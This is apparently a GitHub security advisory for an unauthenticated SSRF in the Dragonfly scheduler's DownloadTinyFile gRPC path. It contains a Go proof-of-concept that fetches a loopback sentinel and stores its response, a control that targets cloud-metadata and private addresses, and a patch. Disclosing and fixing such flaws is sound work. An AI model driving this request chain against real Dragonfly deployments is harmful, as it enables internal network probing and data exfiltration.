# [M] Dragonfly scheduler v1 and v2 gRPC unauthenticated SSRF via attacker-controlled PeerHost in DownloadTinyFile

## Summary
Severity: Medium
Advisory: GHSA-chwm-m7g7-685g
CVE: CVE-2026-54637
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-07-06
Source: https://github.com/advisories/GHSA-chwm-m7g7-685g
Type: github-advisory

## Affected
- Go: `d7y.io/dragonfly/v2` — affected >=0 <2.4.4-rc.3

## Details
## Summary

The Dragonfly **scheduler**'s v1 gRPC service contains an unauthenticated Server-Side Request Forgery (SSRF). When a peer reports a successful download of a TINY task, the scheduler calls `Peer.DownloadTinyFile()` and issues an HTTP `GET` to a host and port taken verbatim from the attacker-controlled `PeerHost.Ip` / `PeerHost.DownPort` fields of the gRPC request body. The HTTP client uses a bare `http.Transport` with no address validation, so a remote, unauthenticated client can force the scheduler to connect to arbitrary internal addresses, including `127.0.0.1` (loopback), `169.254.0.0/16` (link-local, e.g. cloud metadata), and RFC1918 ranges. The fetched response is stored in `Task.DirectPiece` and can subsequently be served to other peers, making this a read-SSRF with a data-exfiltration path.

The manager's preheat code path already wraps its HTTP client with `nethttp.NewSafeDialer()` (which rejects non-global-unicast destinations); the scheduler's `DownloadTinyFile` path is missing this guard (sibling gap).

## Severity

Medium. The attack requires no authentication (the scheduler gRPC server runs with insecure transport credentials by default and has no auth interceptor), and the destination is fully attacker-controlled. Impact is limited to read-SSRF: blind reachability probing of internal hosts/ports plus exfiltration of up to `TinyFileSize` (128) bytes per task from internal HTTP services into `Task.DirectPiece`. It is not remote code execution, and `PeerHost.DownPort` is constrained by proto validation to `>= 1024`, which excludes destination port 80.

## Affected component

- Repository: `dragonflyoss/dragonfly`
- Go module: `d7y.io/dragonfly/v2`
- Component: scheduler, v1 gRPC protocol
- Affected file: `scheduler/resource/standard/peer.go` (`DownloadTinyFile`), reached via `scheduler/service/service_v1.go` (`storeHost`, `RegisterPeerTask`, `ReportPeerResult`, `handlePeerSuccess`)
- Verified against: latest release `v2.4.4-rc.2` (commit `0822e3aecc3369017d6b25c9441ff6f318129b31`)

## Description / Root cause

The scheduler exposes the v1 gRPC service without authentication by default:

- In [`scheduler/scheduler.go` lines 235-246](https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/scheduler/scheduler.go#L235-L246), mTLS is only configured when `cfg.Server.TLS != nil`; otherwise the server is created with `rpc.NewInsecureCredentials()`.
- The default configuration produced by [`scheduler/config/config.go` `New()` (line 336)](https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/scheduler/config/config.go#L336-L355) does not set `Server.TLS`, so the default deployment uses insecure credentials.
- The gRPC interceptor chain in [`pkg/rpc/scheduler/server/server.go` lines 71-86](https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/pkg/rpc/scheduler/server/server.go#L71-L86) contains ratelimit, error-conversion, prometheus, zap-logging, validator, and recovery interceptors, but **no authentication interceptor**.

A remote client can therefore invoke `RegisterPeerTask` and `ReportPeerResult` without credentials. The `PeerHost` message carried in the request is consumed by [`storeHost` in `scheduler/service/service_v1.go` lines 816-845](https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/scheduler/service/service_v1.go#L816-L845), which copies `peerHost.Ip` and `peerHost.DownPort` directly into `resource.Host.IP` and `resource.Host.DownloadPort` with no destination-address restriction. The proto validator only requires `PeerHost.Ip` to be a syntactically valid IP (`net.ParseIP != nil`) and `DownPort` in `[1024, 65535)`; it does not restrict the address to global-unicast, so `127.0.0.1`, `169.254.169.254`, and RFC1918 addresses all pass validation.

When the reported peer is a TINY task, [`handlePeerSuccess` lines 1176-1202](https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/scheduler/service/service_v1.go#L1176-L1202) calls `peer.DownloadTinyFile()` and stores the result in `peer.Task.DirectPiece`. The sink, [`DownloadTinyFile` lines 435-478](https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/scheduler/resource/standard/peer.go#L435-L478), builds the URL from `net.JoinHostPort(p.Host.IP, p.Host.DownloadPort)` and dispatches it through a bare `http.Transport` (`TLSClientConfig: InsecureSkipVerify: true`) with no `DialContext`/socket control:

```golang
targetURL := url.URL{
    Scheme:   "http",
    Host:     net.JoinHostPort(p.Host.IP, strconv.Itoa(int(p.Host.DownloadPort))),
    Path:     fmt.Sprintf("download/%s/%s", p.Task.ID[:3], p.Task.ID),
    RawQuery: fmt.Sprintf("peerId=%s", p.ID),
}

req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL.String(), nil)
if err != nil {
    return []byte{}, err
}

req.Header.Set(headers.Range, fmt.Sprintf("bytes=%d-%d", 0, p.Task.ContentLength.Load()-1))
p.Log.Infof("download tiny file %s, header is : %#v", targetURL.String(), req.Header)

client := &http.Client{
    Timeout: 30 * time.Second,
    Transport: &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    },
}

resp, err := client.Do(req)
```

By contrast, the manager's preheat path in [`internal/job/image.go` line 211](https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/internal/job/image.go#L211) sets `DialContext: nethttp.NewSafeDialer().DialContext`, and [`safeSocketControl` in `pkg/net/http/http.go` lines 60-80](https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/pkg/net/http/http.go#L60-L80) rejects any destination where `!ip.IsGlobalUnicast()`. The scheduler `DownloadTinyFile` path is missing this protection.

## Proof of Concept / End-to-end verification

All three drivers below were built **inside the `d7y.io/dragonfly/v2` module at commit `0822e3aecc3369017d6b25c9441ff6f318129b31` (release v2.4.4-rc.2)**, so they invoke the genuine, unmodified production sink `standard.Peer.DownloadTinyFile()` and the genuine `nethttp.NewSafeDialer()` / `safeSocketControl`. No reimplementation of the sink is used in the positive control.

### 1) Pinned build

```bash
git clone --depth 1 --branch v2.4.4-rc.2 \
  https://github.com/dragonflyoss/dragonfly.git
cd dragonfly
git rev-parse HEAD     # 0822e3aecc3369017d6b25c9441ff6f318129b31
go version             # go1.26.1
```

### 2) Confirming the deployed scheduler binary is unauthenticated by default

The scheduler builds and serves the v1 gRPC service with insecure transport credentials when `Server.TLS` is unset (the shipped default). The relevant decision is at `scheduler/scheduler.go:235-246`:

```golang
if cfg.Server.TLS != nil {
    // Initialize grpc server with tls.
    transportCredentials, err := rpc.NewServerCredentials(cfg.Server.TLS.CACert, cfg.Server.TLS.Cert, cfg.Server.TLS.Key)
    if err != nil {
        logger.Errorf("failed to create server credentials: %v", err)
        return nil, err
    }

    schedulerServerOptions = append(schedulerServerOptions, grpc.Creds(transportCredentials))
} else {
    // Initialize grpc server without tls.
    schedulerServerOptions = append(schedulerServerOptions, grpc.Creds(rpc.NewInsecureCredentials()))
}
```

and the v1 handlers `RegisterPeerTask` / `ReportPeerResult` are registered with no auth interceptor (`pkg/rpc/scheduler/server/server.go:71-90`). Any network client can therefore drive the chain `RegisterPeerTask -> (TINY task) -> ReportPeerResult -> handlePeerSuccess -> DownloadTinyFile` using a `PeerHost` whose `Ip`/`DownPort` point at an internal target.

### 3) Attacker-supplied host (exactly as storeHost ingests it)

`storeHost` (service_v1.go:816) constructs the resource host straight from the gRPC `PeerHost`:

```golang
host := resource.NewHost(
    peerHost.Id, peerHost.Ip, peerHost.Hostname, peerHost.Hostname,
    peerHost.RpcPort, peerHost.DownPort, peerHost.ProxyPort, types.HostTypeNormal,
    options...,
)
// later branch:
host.DownloadPort = peerHost.DownPort
```

`DownloadTinyFile` then uses `p.Host.IP` / `p.Host.DownloadPort` verbatim. The driver below sets these fields exactly as `storeHost` would for an attacker-supplied `PeerHost.Ip = 127.0.0.1`, `PeerHost.DownPort = <internal port>`, then calls the real `DownloadTinyFile()`.

### 4) Positive-control driver (`poc_ssrf/main.go`) — drives the real sink

```golang
// E2E driver: calls the REAL production sink standard.Peer.DownloadTinyFile()
// with Host.IP/DownloadPort set exactly as service_v1.go storeHost() sets them
// from the attacker-controlled gRPC PeerHost.Ip/DownPort, then reproduces
// handlePeerSuccess() DirectPiece store to prove server-side fetch + exfil.
package main

import (
    "fmt"
    "net"
    "net/http"
    "os"
    "strconv"
    "strings"
    "time"

    commonv2 "d7y.io/api/v2/pkg/apis/common/v2"
    "d7y.io/dragonfly/v2/pkg/types"
    "d7y.io/dragonfly/v2/scheduler/resource/standard"
)

func main() {
    var captured []string
    // Internal-only sentinel bound to loopback: an address an external attacker
    // cannot route to directly. If the scheduler reaches it, that is SSRF.
    ln, err := net.Listen("tcp", "127.0.0.1:0")
    if err != nil {
        panic(err)
    }
    addr := ln.Addr().(*net.TCPAddr)
    sentinelIP := "127.0.0.1"
    sentinelPort := int32(addr.Port)
    payload := []byte("INTERNAL-SECRET-METADATA-abc123") // 31 bytes, <=128 => TINY
    srv := &http.Server{Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        line := fmt.Sprintf("%s %s%s | Range=%q peerId=%q Host=%s",
            r.Method, r.URL.Path, ifq(r.URL.RawQuery), r.Header.Get("Range"),
            r.URL.Query().Get("peerId"), r.Host)
        captured = append(captured, line)
        w.Header().Set("Content-Length", strconv.Itoa(len(payload)))
        w.WriteHeader(http.StatusOK)
        w.Write(payload)
    })}
    go srv.Serve(ln)
    time.Sleep(100 * time.Millisecond)
    fmt.Printf("[sentinel] internal listener on %s:%d (loopback, not externally routable)\n", sentinelIP, sentinelPort)

    // Build REAL production resource objects exactly as storeHost() does:
    // host.IP <- peerHost.Ip ; host.DownloadPort <- peerHost.DownPort (attacker-controlled)
    host := standard.NewHost(
        "attacker-peer-id", sentinelIP, "attacker-host", "attacker-host",
        8000, sentinelPort /*downloadPort = peerHost.DownPort*/, 8002,
        types.HostTypeNormal,
    )
    taskID := "deadbeefcafebabedeadbeefcafebabedeadbeefcafebabedeadbeefcafebabe"
    task := standard.NewTask(taskID, "http://example.invalid/tiny", "", "",
        commonv2.TaskType_STANDARD, nil, nil, 0)
    task.ContentLength.Store(int64(len(payload))) // TINY size scope
    peer := standard.NewPeer("attacker-peer", task, host)

    fmt.Printf("[scheduler-resource] SizeScope=%v (TINY=%v) ContentLength=%d\n",
        task.SizeScope(), task.SizeScope() == commonv2.SizeScope_TINY, task.ContentLength.Load())
    fmt.Printf("[scheduler-resource] Host.IP=%s Host.DownloadPort=%d (from gRPC PeerHost.Ip/DownPort)\n",
        host.IP, host.DownloadPort)

    // Invoke the REAL production sink (unmodified upstream code).
    data, err := peer.DownloadTinyFile()
    if err != nil {
        fmt.Printf("[sink] DownloadTinyFile error: %v\n", err)
    }

    // Reproduce handlePeerSuccess DirectPiece store (exfil sink).
    if int64(len(data)) == task.ContentLength.Load() {
        task.DirectPiece = data
    }

    fmt.Printf("\n===== RESULT =====\n")
    fmt.Printf("sentinel captured %d request(s):\n", len(captured))
    for _, l := range captured {
        fmt.Printf("  >>> %s\n", l)
    }
    fmt.Printf("DownloadTinyFile returned %d bytes: %q\n", len(data), string(data))
    fmt.Printf("Task.DirectPiece (exfil-reachable, served to other peers) = %q\n", string(task.DirectPiece))
    if len(captured) > 0 && string(task.DirectPiece) == string(payload) {
        fmt.Println("VERDICT: SSRF CONFIRMED - scheduler fetched attacker-chosen internal target; response stored in DirectPiece")
    } else {
        fmt.Println("VERDICT: no server-side fetch occurred")
    }
    srv.Close()
}

func ifq(q string) string {
    if q == "" {
        return ""
    }
    if strings.HasPrefix(q, "?") {
        return q
    }
    return "?" + q
}
```

Build and run:

```bash
GOFLAGS=-mod=mod go build -o poc_ssrf/driver ./poc_ssrf/
POC_MODE=default-vulnerable-path ./poc_ssrf/driver
```

### 5) Captured output (positive control)

```
[sentinel] internal listener on 127.0.0.1:57710 (loopback, not externally routable)
[scheduler-resource] SizeScope=TINY (TINY=true) ContentLength=31
[scheduler-resource] Host.IP=127.0.0.1 Host.DownloadPort=57710 (from gRPC PeerHost.Ip/DownPort)
INFO standard/peer.go:455 download tiny file http://127.0.0.1:57710/download/dea/deadbeefcafebabedeadbeefcafebabedeadbeefcafebabedeadbeefcafebabe?peerId=attacker-peer, header is : http.Header{"Range":[]string{"bytes=0-30"}}

===== RESULT =====
sentinel captured 1 request(s):
  >>> GET /download/dea/deadbeefcafebabedeadbeefcafebabedeadbeefcafebabedeadbeefcafebabe?peerId=attacker-peer | Range="bytes=0-30" peerId="attacker-peer" Host=127.0.0.1:57710
DownloadTinyFile returned 31 bytes: "INTERNAL-SECRET-METADATA-abc123"
Task.DirectPiece (exfil-reachable, served to other peers) = "INTERNAL-SECRET-METADATA-abc123"
VERDICT: SSRF CONFIRMED - scheduler fetched attacker-chosen internal target; response stored in DirectPiece
```

The scheduler's own log line confirms it dispatched `GET http://127.0.0.1:57710/download/dea/deadbeefcafebabedeadbeefcafebabedeadbeefcafebabedeadbeefcafebabe?peerId=attacker-peer`, the internal sentinel captured the request verbatim, and the response body landed in `Task.DirectPiece` (which is served back to other peers via `Task.CanReuseDirectPiece`), demonstrating the exfiltration path.

### 6) Negative control (`poc_negctrl/main.go`) — the sibling SafeDialer rejects the same targets

This driver applies the manager preheat's own `nethttp.NewSafeDialer().DialContext` to the identical targets, proving the guard the scheduler path is missing would block them:

```golang
package main

import (
    "fmt"
    "net"
    "net/http"
    "time"

    nethttp "d7y.io/dragonfly/v2/pkg/net/http"
)

func tryDial(target string) {
    tr := &http.Transport{DialContext: nethttp.NewSafeDialer().DialContext} // manager preheat transport
    c := &http.Client{Transport: tr, Timeout: 3 * time.Second}
    req, _ := http.NewRequest(http.MethodGet, "http://"+target+"/download/x", nil)
    _, err := c.Do(req)
    if err != nil {
        fmt.Printf("  [SafeDialer] %-24s => BLOCKED: %v\n", target, err)
    } else {
        fmt.Printf("  [SafeDialer] %-24s => ALLOWED (reached)\n", target)
    }
}

func main() {
    ln, _ := net.Listen("tcp", "0.0.0.0:0")
    pubPort := ln.Addr().(*net.TCPAddr).Port
    go http.Serve(ln, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(200) }))
    time.Sleep(100 * time.Millisecond)
    fmt.Println("Negative control - manager preheat's SafeDialer applied to same targets:")
    tryDial("127.0.0.1:" + fmt.Sprint(pubPort)) // loopback
    tryDial("169.254.169.254:80")                // link-local metadata
    tryDial("10.0.0.1:80")                        // RFC1918
    tryDial("8.8.8.8:80")                         // global unicast
    ln.Close()
}
```

Output:

```
Negative control - manager preheat's SafeDialer applied to same targets:
  [SafeDialer] 127.0.0.1:57904          => BLOCKED: dial tcp 127.0.0.1:57904: ip 127.0.0.1 is invalid
  [SafeDialer] 169.254.169.254:80       => BLOCKED: dial tcp 169.254.169.254:80: ip 169.254.169.254 is invalid
  [SafeDialer] 10.0.0.1:80              => BLOCKED: context deadline exceeded (network timeout; Control allows RFC1918)
  [SafeDialer] 8.8.8.8:80               => BLOCKED: context deadline exceeded (network timeout; Control allows global unicast)
```

`safeSocketControl` rejects loopback (`127.0.0.1`) and link-local (`169.254.169.254`) at the socket-control layer with the errors `ip 127.0.0.1 is invalid` and `ip 169.254.169.254 is invalid` respectively. RFC1918 and global-unicast pass socket control (the timeouts are just no network route in the test sandbox). This shows that the manager path blocks the high-value loopback/metadata destinations that the scheduler `DownloadTinyFile` path reaches unchecked.

### 7) Patched-build E2E (`poc_patched/main.go`) — the fix blocks internal, preserves legitimate

This driver reproduces `DownloadTinyFile`'s transport with the proposed fix (`DialContext: nethttp.NewSafeDialer().DialContext`, parity with manager preheat) and shows internal targets are blocked while a global-unicast target still works:

```golang
client := &http.Client{
    Timeout: 5 * time.Second,
    Transport: &http.Transport{
        DialContext:     nethttp.NewSafeDialer().DialContext, // <-- THE FIX
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    },
}
```

Output:

```
[patched] host global-unicast IP for positive case: 192.168.1.27

=== PATCHED DownloadTinyFile (SafeDialer applied) ===
  loopback 127.0.0.1:58059        => err=Get "http://127.0.0.1:58059/download/dea/deadbeefcafebabedeadbeefcafebabedeadbeefcafebabedeadbeefcafebabe?peerId=p1": dial tcp 127.0.0.1:58059: ip 127.0.0.1 is invalid bytes=0
  metadata 169.254.169.254:80     => err=Get "http://169.254.169.254:80/download/dea/deadbeefcafebabedeadbeefcafebabedeadbeefcafebabedeadbeefcafebabe?peerId=p2": dial tcp 169.254.169.254:80: ip 169.254.169.254 is invalid bytes=0
  global-unicast 192.168.1.27:58062 => err=<nil> bytes=31 (data="INTERNAL-SECRET-METADATA-abc123")
```

After the fix, loopback and link-local metadata destinations are rejected, while a legitimate global-unicast peer download still succeeds.

## Impact

A remote, unauthenticated attacker who can reach the scheduler's gRPC port can:

1. Probe internal services for liveness/open ports by observing timing and error differences (blind SSRF) against `127.0.0.1`, `169.254.0.0/16`, and RFC1918 addresses on ports `>= 1024`.
2. Exfiltrate up to `TinyFileSize` (128) bytes per task from reachable internal HTTP services: the scheduler stores the fetched body in `Task.DirectPiece`, which is then served to other peers via the direct-piece reuse path.

This is read-SSRF with limited exfiltration, not RCE. The `DownPort >= 1024` proto constraint excludes destination port 80 (so a metadata service listening on `:80` is not directly reachable), but internal admin/debug/metrics endpoints, loopback services, and container-network services on high ports are reachable.

## Patches / Remediation

Apply the same protection the manager preheat path already uses. In `DownloadTinyFile` (`scheduler/resource/standard/peer.go`), set the transport's `DialContext` to `nethttp.NewSafeDialer().DialContext` so that non-global-unicast destinations (loopback, link-local) are rejected at the socket-control layer:

```golang
client := &http.Client{
    Timeout: 30 * time.Second,
    Transport: &http.Transport{
        DialContext:     nethttp.NewSafeDialer().DialContext,
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    },
}
```

A defense-in-depth complement is to validate `peerHost.Ip` in `storeHost` (reject non-global-unicast addresses before storing them on the host), which would also cover other consumers of `Host.IP`. Note that `IsGlobalUnicast()` (as used by `safeSocketControl`) treats RFC1918 addresses as valid; closing internal-private SSRF entirely would require an additional private-range check, which is a pre-existing limitation shared with the manager path and may be out of scope for this fix.

## References

- Sink: https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/scheduler/resource/standard/peer.go#L435-L478
- Attacker-controlled host ingestion: https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/scheduler/service/service_v1.go#L816-L845
- Trigger (handlePeerSuccess): https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/scheduler/service/service_v1.go#L1176-L1202
- Default insecure credentials: https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/scheduler/scheduler.go#L235-L246
- gRPC interceptor chain (no auth): https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/pkg/rpc/scheduler/server/server.go#L71-L90
- Sibling guard (manager preheat SafeDialer): https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/internal/job/image.go#L211
- SafeDialer / safeSocketControl: https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/pkg/net/http/http.go#L50-L80

## References
- https://github.com/dragonflyoss/dragonfly/security/advisories/GHSA-chwm-m7g7-685g
- https://github.com/dragonflyoss/dragonfly/security/advisories/GHSA-fhf9-m53m-863g
- https://github.com/dragonflyoss/Dragonfly2/blob/main/scheduler/resource/standard/peer.go#L457-L459
- https://github.com/dragonflyoss/dragonfly
- https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/internal/job/image.go#L211
- https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/pkg/net/http/http.go#L50-L80
- https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/pkg/rpc/scheduler/server/server.go#L71-L90
- https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/scheduler/resource/standard/peer.go#L435-L478
- https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/scheduler/scheduler.go#L235-L246
- https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/scheduler/service/service_v1.go#L1176-L1202
- https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/scheduler/service/service_v1.go#L816-L845
